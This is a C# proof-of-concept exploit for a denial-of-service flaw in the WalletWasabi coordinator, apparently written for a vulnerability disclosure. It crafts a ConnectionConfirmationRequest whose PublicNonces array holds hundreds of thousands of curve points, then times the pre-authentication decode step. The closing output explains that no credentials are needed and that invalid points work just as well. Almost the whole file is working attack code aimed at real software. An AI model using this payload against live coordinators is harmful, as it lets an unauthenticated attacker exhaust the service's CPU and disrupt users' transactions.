/*
 * End-to-end DoS PoC for the WalletWasabi coordinator's request deserialization.
 *
 * Drives the EXACT method the coordinator's WasabiJsonInputFormatter calls --
 * Decode.CoordinatorMessageFromStreamAsync -- with a crafted ConnectionConfirmationRequest
 * body whose Proofs[0].PublicNonces array is oversized. The uncapped Array/GroupElementVector
 * decoders (Primitives.cs:154, WabiSabi.cs:77) run GroupElement.FromBytes (eager on-curve check)
 * per element, before any AliceId / ownership / UTXO validation in the Arena handler.
 */
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using WalletWasabi.Serialization;
using WalletWasabi.WabiSabi.Models;

class DosPoc
{
    // secp256k1 generator G, compressed (a valid curve point => forces the on-curve sqrt to succeed).
    const string ValidPointHex = "0279BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798";

    static string EmptyZero() => "{\"Requested\":[],\"Proofs\":[]}";
    static string EmptyReal() => "{\"Delta\":0,\"Presented\":[],\"Requested\":[],\"Proofs\":[]}";

    // A RealCredentialsRequest carrying a single Proof with N public-nonce points.
    static string RealWithNonces(int n)
    {
        var sb = new StringBuilder();
        sb.Append("{\"Delta\":0,\"Presented\":[],\"Requested\":[],\"Proofs\":[{\"PublicNonces\":[");
        for (int i = 0; i < n; i++)
        {
            if (i > 0) sb.Append(',');
            sb.Append('"').Append(ValidPointHex).Append('"');
        }
        sb.Append("],\"Responses\":[\"0000000000000000000000000000000000000000000000000000000000000001\"]}]}");
        return sb.ToString();
    }

    static string Body(int nNonces)
    {
        return "{"
            + "\"RoundId\":\"0000000000000000000000000000000000000000000000000000000000000000\","
            + "\"AliceId\":\"00000000-0000-0000-0000-000000000000\","
            + "\"ZeroAmountCredentialRequests\":" + EmptyZero() + ","
            + "\"RealAmountCredentialRequests\":" + RealWithNonces(nNonces) + ","
            + "\"ZeroVsizeCredentialRequests\":" + EmptyZero() + ","
            + "\"RealVsizeCredentialRequests\":" + EmptyReal()
            + "}";
    }

    static async Task<(bool ok, double ms)> TimeDecode(int nNonces)
    {
        var json = Body(nNonces);
        var bytes = Encoding.UTF8.GetBytes(json);
        using var ms = new MemoryStream(bytes);
        var sw = Stopwatch.StartNew();
        var result = await Decode.CoordinatorMessageFromStreamAsync(ms, typeof(ConnectionConfirmationRequest));
        sw.Stop();
        // result.IsOk == the coordinator got a fully-materialized request object (pre-auth).
        return (result.IsOk, sw.Elapsed.TotalMilliseconds);
    }

    static async Task Main()
    {
        Console.WriteLine("WalletWasabi coordinator deserialization DoS PoC");
        Console.WriteLine("(times the real CoordinatorMessageFromStreamAsync, the pre-auth code path)\n");

        // warm up JIT
        await TimeDecode(1000);

        foreach (var n in new[] { 10_000, 100_000, 300_000, 449_000 })
        {
            var bodyBytes = Encoding.UTF8.GetBytes(Body(n)).Length;
            var (ok, ms) = await TimeDecode(n);
            Console.WriteLine($"  PublicNonces={n,8}  body={bodyBytes / (1024.0 * 1024):F1} MB  decode={ms / 1000:F2} s  materialized={ok}");
        }

        Console.WriteLine("\nAll of this runs in the input formatter BEFORE ConfirmConnectionAsync validates");
        Console.WriteLine("the AliceId/round. No auth, no UTXO, no rate-limit at this layer; body cap is the");
        Console.WriteLine("Kestrel default (~30 MB). Attacker can send garbage points too (failed on-curve");
        Console.WriteLine("check costs the same), so no valid credentials are needed.");
    }
}
